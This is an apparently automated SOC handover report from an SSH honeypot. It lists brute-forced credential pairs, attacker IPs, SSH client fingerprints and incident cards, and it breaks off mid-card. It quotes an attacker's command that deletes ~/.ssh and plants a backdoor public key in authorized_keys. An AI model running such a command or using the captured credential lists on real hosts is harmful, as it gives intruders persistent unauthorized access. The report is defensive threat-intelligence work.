# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-08 |
| **Generated At** | 2026-08-08T10:38:44Z |
| **Shift Time** | 10:38 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **246** |
| Confirmed Threats | **230** |
| False Positives Filtered | **16** (6.5%) |
| Unique Attacker IPs | **77** |
| Countries of Origin | **25** |
| High Severity Cases | **181** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **65** |
| Malware Samples Analyzed | **2** HIGH · **24** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **197** |
| Unique Credential Pairs | **165** |
| Unique Usernames | **88** |
| Unique Passwords | **116** |
| Successful Auth Pairs | **191** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 49 |
| `nobody` | 13 |
| `centos` | 7 |
| `user` | 6 |
| `debian` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 13 |
| `12345` | 8 |
| `123` | 7 |
| `1234` | 6 |
| `root` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `nobody` | `nobody2000` | 5 |
| `centos` | `centos2019` | 5 |
| `root` | `vizxv` | 4 |
| `supervisor` | `password` | 4 |
| `root` | `44444` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ftpuser1` | `123456` | `45.153.34.181` | 2026-08-08T06:55:06 |
| `ubuntu` | `qwe123` | `45.153.34.181` | 2026-08-08T06:55:10 |
| `deployer` | `12345678` | `45.153.34.181` | 2026-08-08T06:55:13 |
| `parsa` | `parsa` | `45.153.34.181` | 2026-08-08T06:55:17 |
| `ducc0x` | `phuvanduc` | `45.153.34.181` | 2026-08-08T06:55:21 |
| `deploy` | `qwerty123` | `45.153.34.181` | 2026-08-08T06:55:25 |
| `debian` | `toor` | `45.153.34.181` | 2026-08-08T06:55:29 |
| `runner` | `root` | `45.153.34.181` | 2026-08-08T06:55:33 |
| `root` | `vizxv` | `10.0.0.73` | 2026-08-08T06:55:33 |
| `debian` | `123456789` | `45.153.34.181` | 2026-08-08T06:55:36 |
| `root` | `root@123` | `45.153.34.181` | 2026-08-08T06:55:40 |
| `test` | `qwerty123` | `45.153.34.181` | 2026-08-08T06:55:44 |
| `trade` | `123456` | `45.153.34.181` | 2026-08-08T06:55:48 |
| `root` | `Root@123` | `45.153.34.181` | 2026-08-08T06:55:51 |
| `test3` | `1` | `45.153.34.181` | 2026-08-08T06:55:56 |
| `admin` | `!QAZ2wsx` | `45.153.34.181` | 2026-08-08T06:55:59 |
| `jenkins` | `jenkins@123` | `45.153.34.181` | 2026-08-08T06:56:03 |
| `root` | `12345qwert` | `45.153.34.181` | 2026-08-08T06:56:07 |
| `tomcat` | `tomcat` | `45.153.34.181` | 2026-08-08T06:56:12 |
| `root` | `CatCult2025!` | `45.153.34.181` | 2026-08-08T06:56:16 |
| `ai` | `123456` | `45.153.34.181` | 2026-08-08T06:56:19 |
| `debian` | `debian` | `45.153.34.181` | 2026-08-08T06:56:24 |
| `root` | `741852963` | `45.153.34.181` | 2026-08-08T06:56:28 |
| `rdpuser` | `123` | `45.153.34.181` | 2026-08-08T06:56:32 |
| `server` | `12345` | `45.153.34.181` | 2026-08-08T06:56:36 |
| `frappe` | `123` | `45.153.34.181` | 2026-08-08T06:56:40 |
| `t1` | `123` | `45.153.34.181` | 2026-08-08T06:56:44 |
| `alex` | `1234` | `45.153.34.181` | 2026-08-08T06:56:48 |
| `master` | `123` | `45.153.34.181` | 2026-08-08T06:56:52 |
| `root` | `qwer1234` | `45.153.34.181` | 2026-08-08T06:56:56 |
| `kingbase` | `123456` | `45.153.34.181` | 2026-08-08T06:57:00 |
| `deploy` | `rootroot` | `45.153.34.181` | 2026-08-08T06:57:04 |
| `cloud` | `1234` | `45.153.34.181` | 2026-08-08T06:57:08 |
| `hadoop` | `hadoop` | `45.153.34.181` | 2026-08-08T06:57:12 |
| `root` | `111111` | `45.153.34.181` | 2026-08-08T06:57:16 |
| `debian` | `123456` | `45.153.34.181` | 2026-08-08T06:57:20 |
| `user` | `12345678` | `45.153.34.181` | 2026-08-08T06:57:24 |
| `debian` | `Aa123456.` | `45.153.34.181` | 2026-08-08T06:57:28 |
| `gabriel` | `123321` | `45.153.34.181` | 2026-08-08T06:57:32 |
| `worker` | `worker` | `45.153.34.181` | 2026-08-08T06:57:36 |
| `root1` | `gg` | `45.153.34.181` | 2026-08-08T06:57:41 |
| `root` | `Aa123456@` | `45.153.34.181` | 2026-08-08T06:57:45 |
| `work` | `work` | `45.153.34.181` | 2026-08-08T06:57:48 |
| `runner` | `1234` | `45.153.34.181` | 2026-08-08T06:57:53 |
| `gitlab` | `git` | `45.153.34.181` | 2026-08-08T06:57:57 |
| `developer` | `root` | `45.153.34.181` | 2026-08-08T06:58:01 |
| `kim` | `kim123` | `45.153.34.181` | 2026-08-08T06:58:05 |
| `mc` | `mc` | `45.153.34.181` | 2026-08-08T06:58:09 |
| `openclaw` | `12345` | `45.153.34.181` | 2026-08-08T06:58:13 |
| `administrator` | `Passw0rd` | `45.153.34.181` | 2026-08-08T06:58:17 |
| `ossuser` | `Changeme_123` | `45.153.34.181` | 2026-08-08T06:58:21 |
| `user3` | `user3` | `45.153.34.181` | 2026-08-08T06:58:25 |
| `vncuser` | `vncuser` | `45.153.34.181` | 2026-08-08T06:58:29 |
| `hu` | `123456` | `45.153.34.181` | 2026-08-08T06:58:34 |
| `onkar` | `onkar123` | `45.153.34.181` | 2026-08-08T06:58:38 |
| `root` | `Pass@123` | `45.153.34.181` | 2026-08-08T06:58:42 |
| `coder` | `123456` | `45.153.34.181` | 2026-08-08T06:58:46 |
| `ts3` | `123` | `45.153.34.181` | 2026-08-08T06:58:50 |
| `nobody` | `Passw0rd` | `106.245.246.26` | 2026-08-08T06:58:51 |
| `admin1` | `123456` | `45.153.34.181` | 2026-08-08T06:58:54 |
| `root` | `12345qwe` | `45.153.34.181` | 2026-08-08T06:58:58 |
| `user` | `rootroot` | `45.153.34.181` | 2026-08-08T06:59:02 |
| `root` | `Huawei123` | `45.153.34.181` | 2026-08-08T06:59:06 |
| `tester` | `12345` | `45.153.34.181` | 2026-08-08T06:59:10 |
| `cloud` | `cloud123!` | `45.153.34.181` | 2026-08-08T06:59:14 |
| `root` | `1qaz2wsx` | `45.153.34.181` | 2026-08-08T06:59:18 |
| `minecraft` | `1234` | `45.153.34.181` | 2026-08-08T06:59:22 |
| `admin` | `111` | `45.153.34.181` | 2026-08-08T06:59:26 |
| `cursor` | `cursor` | `45.153.34.181` | 2026-08-08T06:59:30 |
| `toto` | `toto` | `45.153.34.181` | 2026-08-08T06:59:34 |
| `testuser` | `testuser` | `45.153.34.181` | 2026-08-08T06:59:39 |
| `stack` | `stack` | `45.153.34.181` | 2026-08-08T06:59:43 |
| `mysql` | `mysql@1234` | `45.153.34.181` | 2026-08-08T06:59:47 |
| `user` | `1` | `45.153.34.181` | 2026-08-08T06:59:51 |
| `user` | `passw0rd` | `45.153.34.181` | 2026-08-08T06:59:55 |
| `user10` | `user10` | `45.153.34.181` | 2026-08-08T06:59:59 |
| `root` | `abc12345` | `45.153.34.181` | 2026-08-08T07:00:03 |
| `calvin` | `calvin` | `45.153.34.181` | 2026-08-08T07:00:07 |
| `claude` | `1` | `45.153.34.181` | 2026-08-08T07:00:11 |
| `dev` | `1qaz2wsx` | `45.153.34.181` | 2026-08-08T07:00:15 |
| `rancher` | `rancher123` | `45.153.34.181` | 2026-08-08T07:00:19 |
| `vncuser` | `123456` | `45.153.34.181` | 2026-08-08T07:00:23 |
| `root` | `Password1` | `45.153.34.181` | 2026-08-08T07:00:27 |
| `sysupdate` | `Password1` | `45.153.34.181` | 2026-08-08T07:00:32 |
| `teamspeak` | `raspberry` | `45.153.34.181` | 2026-08-08T07:00:36 |
| `customer` | `customer` | `45.153.34.181` | 2026-08-08T07:00:40 |
| `sysupdate` | `123456` | `45.153.34.181` | 2026-08-08T07:00:44 |
| `sam` | `123456789` | `45.153.34.181` | 2026-08-08T07:00:48 |
| `root` | `1` | `45.153.34.181` | 2026-08-08T07:00:52 |
| `fastuser` | `123456789` | `45.153.34.181` | 2026-08-08T07:00:56 |
| `gns3` | `gns3` | `45.153.34.181` | 2026-08-08T07:01:00 |
| `deployer` | `user` | `45.153.34.181` | 2026-08-08T07:01:04 |
| `root` | `Admin123!@#` | `45.153.34.181` | 2026-08-08T07:01:08 |
| `claude` | `12345678` | `45.153.34.181` | 2026-08-08T07:01:12 |
| `root` | `19901017` | `45.153.34.181` | 2026-08-08T07:01:16 |
| `root` | `Yun@wocloud.szkj` | `45.153.34.181` | 2026-08-08T07:01:20 |
| `user` | `root` | `45.153.34.181` | 2026-08-08T07:01:25 |
| `rdpuser` | `rdpuser` | `45.153.34.181` | 2026-08-08T07:01:29 |
| `deploy` | `root` | `45.153.34.181` | 2026-08-08T07:01:33 |
| `ubuntu` | `1234qwer` | `45.153.34.181` | 2026-08-08T07:01:37 |
| `angel` | `angel` | `45.153.34.181` | 2026-08-08T07:01:41 |
| `minecraft` | `minecraft` | `45.153.34.181` | 2026-08-08T07:01:45 |
| `webuser` | `webuser` | `45.153.34.181` | 2026-08-08T07:01:49 |
| `root` | `linux` | `45.153.34.181` | 2026-08-08T07:01:53 |
| `root` | `a123456A` | `45.153.34.181` | 2026-08-08T07:01:57 |
| `installer` | `12345` | `45.153.34.181` | 2026-08-08T07:02:01 |
| `support` | `support` | `176.53.159.196` | 2026-08-08T07:02:02 |
| `admin` | `123456789` | `45.153.34.181` | 2026-08-08T07:02:05 |
| `test` | `1234qwer` | `45.153.34.181` | 2026-08-08T07:02:09 |
| `root` | `qq123456` | `45.153.34.181` | 2026-08-08T07:02:13 |
| `root` | `helloworld` | `45.153.34.181` | 2026-08-08T07:02:17 |
| `amin` | `amin` | `45.153.34.181` | 2026-08-08T07:02:21 |
| `mcserver` | `mcserver` | `45.153.34.181` | 2026-08-08T07:02:26 |
| `claude` | `123` | `45.153.34.181` | 2026-08-08T07:02:30 |
| `bot` | `111111` | `45.153.34.181` | 2026-08-08T07:02:34 |
| `prem` | `12345` | `45.153.34.181` | 2026-08-08T07:02:38 |
| `root` | `qazwsxedc` | `45.153.34.181` | 2026-08-08T07:02:42 |
| `dev` | `111111` | `45.153.34.181` | 2026-08-08T07:02:46 |
| `pi` | `pi` | `45.153.34.181` | 2026-08-08T07:02:50 |
| `sftpuser` | `123` | `45.153.34.181` | 2026-08-08T07:02:54 |
| `ai` | `ai` | `45.153.34.181` | 2026-08-08T07:02:58 |
| `myuser` | `123456` | `45.153.34.181` | 2026-08-08T07:03:02 |
| `root` | `root@2026` | `45.153.34.181` | 2026-08-08T07:03:06 |
| `xiao` | `xiao` | `45.153.34.181` | 2026-08-08T07:03:11 |
| `administrator` | `12345678` | `45.153.34.181` | 2026-08-08T07:03:15 |
| `david` | `123456` | `45.153.34.181` | 2026-08-08T07:03:19 |
| `operator` | `operator` | `45.153.34.181` | 2026-08-08T07:03:23 |
| `reza` | `reza` | `45.153.34.181` | 2026-08-08T07:03:27 |
| `nexus` | `nexus` | `45.153.34.181` | 2026-08-08T07:03:31 |
| `operator` | `operator2026` | `45.153.34.181` | 2026-08-08T07:03:35 |
| `root` | `test1234` | `45.153.34.181` | 2026-08-08T07:03:39 |
| `root` | `102030` | `45.153.34.181` | 2026-08-08T07:03:43 |
| `packer` | `packer` | `45.153.34.181` | 2026-08-08T07:03:47 |
| `root` | `admin1234` | `45.153.34.181` | 2026-08-08T07:03:51 |
| `git` | `dev` | `45.153.34.181` | 2026-08-08T07:03:55 |
| `server` | `server` | `45.153.34.181` | 2026-08-08T07:03:59 |
| `root` | `1q2w3e4r` | `45.153.34.181` | 2026-08-08T07:04:03 |
| `airflow` | `airflow` | `45.153.34.181` | 2026-08-08T07:04:08 |
| `john` | `john` | `45.153.34.181` | 2026-08-08T07:04:11 |
| `sam` | `1234` | `45.153.34.181` | 2026-08-08T07:04:16 |
| `pi` | `123456` | `45.153.34.181` | 2026-08-08T07:04:20 |
| `app` | `root` | `45.153.34.181` | 2026-08-08T07:04:24 |
| `root` | `1qaz!QAZ` | `45.153.34.181` | 2026-08-08T07:04:28 |
| `git` | `1234` | `45.153.34.181` | 2026-08-08T07:04:32 |
| `root` | `Abcd1234` | `45.153.34.181` | 2026-08-08T07:04:36 |
| `supervisor` | `password` | `122.170.99.195` | 2026-08-08T07:09:07 |
| `supervisor` | `password` | `24.97.253.246` | 2026-08-08T07:09:14 |
| `supervisor` | `password` | `220.246.43.109` | 2026-08-08T07:09:26 |
| `supervisor` | `password` | `196.189.124.218` | 2026-08-08T07:09:39 |
| `root` | `vizxv` | `221.120.57.125` | 2026-08-08T07:13:11 |
| `root` | `vizxv` | `90.228.229.182` | 2026-08-08T07:13:17 |
| `nobody` | `nobody2000` | `170.233.29.157` | 2026-08-08T07:17:47 |
| `centos` | `centos8` | `116.7.248.50` | 2026-08-08T07:18:23 |
| `centos` | `centos8` | `218.15.224.102` | 2026-08-08T07:18:35 |
| `nobody` | `nobody2000` | `218.29.231.106` | 2026-08-08T07:20:59 |
| `nobody` | `nobody2000` | `117.177.235.249` | 2026-08-08T07:21:13 |
| `nobody` | `nobody2000` | `10.0.0.73` | 2026-08-08T07:21:21 |
| `support` | `support` | `10.0.0.73` | 2026-08-08T07:26:51 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-08-08T07:29:55 |
| `user` | `123123123a` | `24.142.170.231` | 2026-08-08T07:33:17 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-08T07:38:35 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-08T07:38:35 |
| `centos` | `centos2019` | `124.239.129.2` | 2026-08-08T07:40:51 |
| `centos` | `centos2019` | `178.178.194.135` | 2026-08-08T07:41:04 |
| `root` | `newroot` | `218.25.233.22` | 2026-08-08T07:43:45 |
| `centos` | `centos2019` | `179.185.1.97` | 2026-08-08T07:44:07 |
| `centos` | `centos2019` | `49.124.153.23` | 2026-08-08T07:44:20 |
| `centos` | `centos2019` | `10.0.0.73` | 2026-08-08T07:44:27 |
| `root` | `44444` | `104.152.58.233` | 2026-08-08T07:53:06 |
| `root` | `44444` | `125.72.150.250` | 2026-08-08T07:53:16 |
| `nobody` | `12345` | `10.0.0.73` | 2026-08-08T07:59:44 |
| `root` | `44444` | `10.0.0.73` | 2026-08-08T08:05:05 |
| `nobody` | `nobody2013` | `196.188.93.169` | 2026-08-08T08:06:51 |
| `nobody` | `nobody2013` | `103.203.210.119` | 2026-08-08T08:06:59 |
| `nobody` | `nobody2013` | `10.0.0.73` | 2026-08-08T08:07:18 |
| `nobody` | `12345` | `117.158.166.73` | 2026-08-08T08:18:27 |
| `nobody` | `12345` | `112.6.11.184` | 2026-08-08T08:18:37 |
| `root` | `44444` | `211.178.165.251` | 2026-08-08T08:22:38 |
| `root` | `Password01` | `10.0.0.73` | 2026-08-08T08:24:34 |
| `root` | `Password01` | `91.219.196.17` | 2026-08-08T08:26:15 |
| `config` | `121212` | `85.105.2.51` | 2026-08-08T08:26:45 |
| `config` | `121212` | `155.212.17.174` | 2026-08-08T08:26:52 |
| `config` | `121212` | `197.251.193.6` | 2026-08-08T08:30:06 |
| `root` | `P@$$w0rd` | `10.0.0.73` | 2026-08-08T08:39:41 |
| `admin` | `0123456789` | `5.88.119.21` | 2026-08-08T08:42:26 |
| `345gs5662d34` | `345gs5662d34` | `5.88.119.21` | 2026-08-08T08:42:28 |
| `admin` | `3245gs5662d34` | `5.88.119.21` | 2026-08-08T08:42:29 |
| `root` | `passwd` | `213.130.207.177` | 2026-08-08T08:52:57 |
| `test` | `test2001` | `111.70.23.223` | 2026-08-08T08:53:00 |
| `root` | `passwd` | `111.70.32.49` | 2026-08-08T08:53:13 |
| `test` | `test2001` | `10.0.0.73` | 2026-08-08T08:53:24 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **246** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 145 |
| OpenSSH | 33 |
| libssh | 10 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 142 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 33 | 33 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `a2de0f306611...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 142 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 33 | 33 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `5.88.119.21`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **77** |
| Unique ASNs | **52** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 6 | HIGH |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS46562` | Performive LLC | 5 | MEDIUM |
| `AS17421` | Mobile Business Group | 4 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 2 | HIGH |
| `AS48721` | Flyservers S.A. | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (181)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b1daa2b3e9df

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:05` | `cowrie.session.connect` |
| `2026-08-08 06:55:05` | `cowrie.client.version` |
| `2026-08-08 06:55:05` | `cowrie.client.kex` |
| `2026-08-08 06:55:06` | `cowrie.login.success` |
| `2026-08-08 06:55:07` | `cowrie.session.params` |
| `2026-08-08 06:55:07` | `cowrie.command.input` |
| `2026-08-08 06:55:07` | `cowrie.log.closed` |
| `2026-08-08 06:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97e013fe064b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:09` | `cowrie.session.connect` |
| `2026-08-08 06:55:09` | `cowrie.client.version` |
| `2026-08-08 06:55:09` | `cowrie.client.kex` |
| `2026-08-08 06:55:10` | `cowrie.login.success` |
| `2026-08-08 06:55:11` | `cowrie.session.params` |
| `2026-08-08 06:55:11` | `cowrie.command.input` |
| `2026-08-08 06:55:11` | `cowrie.log.closed` |
| `2026-08-08 06:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7a0b810408b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:13` | `cowrie.session.connect` |
| `2026-08-08 06:55:13` | `cowrie.client.version` |
| `2026-08-08 06:55:13` | `cowrie.client.kex` |
| `2026-08-08 06:55:13` | `cowrie.login.success` |
| `2026-08-08 06:55:14` | `cowrie.session.params` |
| `2026-08-08 06:55:14` | `cowrie.command.input` |
| `2026-08-08 06:55:14` | `cowrie.log.closed` |
| `2026-08-08 06:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00a7d6fe36bc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:17` | `cowrie.session.connect` |
| `2026-08-08 06:55:17` | `cowrie.client.version` |
| `2026-08-08 06:55:17` | `cowrie.client.kex` |
| `2026-08-08 06:55:17` | `cowrie.login.success` |
| `2026-08-08 06:55:18` | `cowrie.session.params` |
| `2026-08-08 06:55:18` | `cowrie.command.input` |
| `2026-08-08 06:55:18` | `cowrie.log.closed` |
| `2026-08-08 06:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66a144ffce1e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:21` | `cowrie.session.connect` |
| `2026-08-08 06:55:21` | `cowrie.client.version` |
| `2026-08-08 06:55:21` | `cowrie.client.kex` |
| `2026-08-08 06:55:21` | `cowrie.login.success` |
| `2026-08-08 06:55:22` | `cowrie.session.params` |
| `2026-08-08 06:55:22` | `cowrie.command.input` |
| `2026-08-08 06:55:22` | `cowrie.log.closed` |
| `2026-08-08 06:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-650cecf7ae47

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:24` | `cowrie.session.connect` |
| `2026-08-08 06:55:24` | `cowrie.client.version` |
| `2026-08-08 06:55:25` | `cowrie.client.kex` |
| `2026-08-08 06:55:25` | `cowrie.login.success` |
| `2026-08-08 06:55:26` | `cowrie.session.params` |
| `2026-08-08 06:55:26` | `cowrie.command.input` |
| `2026-08-08 06:55:26` | `cowrie.log.closed` |
| `2026-08-08 06:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c83d678a0fcd

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:28` | `cowrie.session.connect` |
| `2026-08-08 06:55:28` | `cowrie.client.version` |
| `2026-08-08 06:55:28` | `cowrie.client.kex` |
| `2026-08-08 06:55:29` | `cowrie.login.success` |
| `2026-08-08 06:55:29` | `cowrie.session.params` |
| `2026-08-08 06:55:29` | `cowrie.command.input` |
| `2026-08-08 06:55:30` | `cowrie.log.closed` |
| `2026-08-08 06:55:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8879a14fe70e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:32` | `cowrie.session.connect` |
| `2026-08-08 06:55:32` | `cowrie.client.version` |
| `2026-08-08 06:55:32` | `cowrie.client.kex` |
| `2026-08-08 06:55:33` | `cowrie.login.success` |
| `2026-08-08 06:55:33` | `cowrie.session.params` |
| `2026-08-08 06:55:33` | `cowrie.command.input` |
| `2026-08-08 06:55:34` | `cowrie.log.closed` |
| `2026-08-08 06:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]181` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cc6dec81de1

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]181` |
| **First Seen** | 2026-08-08 06:55 |
| **Last Seen** | 2026-08-08 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 06:55:36` | `cowrie.session.connect` |
